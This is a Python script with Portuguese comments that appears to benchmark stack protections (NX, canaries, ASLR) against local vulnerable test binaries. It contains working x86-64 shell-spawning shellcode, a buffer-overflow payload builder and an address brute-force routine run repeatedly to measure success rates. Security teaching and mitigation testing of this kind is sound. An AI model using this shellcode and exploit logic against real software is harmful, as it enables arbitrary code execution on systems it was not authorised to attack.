# benchmark.py
"""

# benchmark de diferentes binários com e sem proteções de segurança o objetivo é medir
# a eficácia das proteções contra ataques de buffer overflow simples
# funciona rodando múltiplas tentativas de exploração e medindo a taxa de sucesso e o tempo médio

"""

import subprocess, sys, struct, time, os

ROUNDS = 10
BRUTE_ROUNDS = 10 

def calibrate(bin_path):
    print(f"calibrando {bin_path}...")
    
    # Aumentando o range de busca para garantir que encontre a stack em diferentes ambientes
    for addr in range(0x7fffffffa000, 0x7ffffffff000, 16):
        if exploit(bin_path, addr, aslr=False):
            print(f"stack encontrada @ {hex(addr)}")
            return addr
            
    print("falha na calibração, usando padrão")
    return 0x7fffffffe480

def exploit(binary, target, aslr=False):
  
    sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
    payload = sc + (b"\x90" * (56 - len(sc)))
    payload += struct.pack("<Q", target)[:6]

    cmd = [binary, "admin", payload]
    if not aslr:
        cmd = ["setarch", "x86_64", "-R"] + cmd

    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        p.stdin.write(b"echo PWNED\n")
        p.stdin.flush()
        
        out, _ = p.communicate(timeout=0.2)
        return b"PWNED" in out
        
    except:
        return False

def bench(name, binary, addr, aslr=False):
    print(f"Testando: {name} (ASLR={'ON' if aslr else 'OFF'})")
    
    ok = 0
    t_start = time.time()
    
    for _ in range(ROUNDS):
        if exploit(binary, addr, aslr):
            ok += 1
            
    avg = (time.time() - t_start) / ROUNDS
    print(f"  -> Resultado: {ok}/{ROUNDS} sucessos | tempo médio: {avg:.4f}s")
    print("-" * 30)
    
    return (name, ok, avg)

def brute_32():
    print(f"\niniciando bruteforce ASLR 32-bit ({BRUTE_ROUNDS} rounds)")
    total_tries = 0
    
    for i in range(BRUTE_ROUNDS):
        tries = 0
        while True:
            tries += 1
            
            out = subprocess.check_output(["./bin/get_addr_32"]).strip()
            
            
            if b"c0" in out[-3:]:
                print(f"  round {i+1}: sucesso em {tries} tentativas")
                total_tries += tries
                break
                
    print(f"  média de tentativas: {total_tries / BRUTE_ROUNDS:.1f}")

def print_banner():
    print(r"""
              .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  ##                 ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||                     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
    """)

def main():
    print_banner()
    print("=== Benchmark de Segurança ===")
    os.system("make all > /dev/null 2>&1")

    
    print("\nChecagem de Entropia")
    print("Vuln (Simulado):")
    os.system("setarch x86_64 -R ./bin/get_addr_64")
    
    print("\nSeguro (Nativo):")
    for _ in range(5):
        os.system("./bin/get_addr_64")

    
    print("\nCalibração")
    stack = calibrate("./bin/vuln")

    
    print("\nRodando Testes")
    results = []
    results.append(bench("Sem Proteção", "./bin/vuln", stack, aslr=False))
    results.append(bench("Só NX", "./bin/nx", stack, aslr=False))
    results.append(bench("Canary",  "./bin/canary", stack, aslr=False))
    results.append(bench("Seguro",  "./bin/secure", stack, aslr=True))

    if os.path.exists("./bin/get_addr_32"):
        brute_32()

    print("\n=== ESTATÍSTICAS FINAIS ===")
    print(f"{'Cenário':<15} {'Sucesso':<10} {'Tempo':<10}")
    for name, ok, t in results:
        print(f"{name:<15} {ok}/{ROUNDS:<8} {t:.4f}s")

if __name__ == "__main__":
    main()
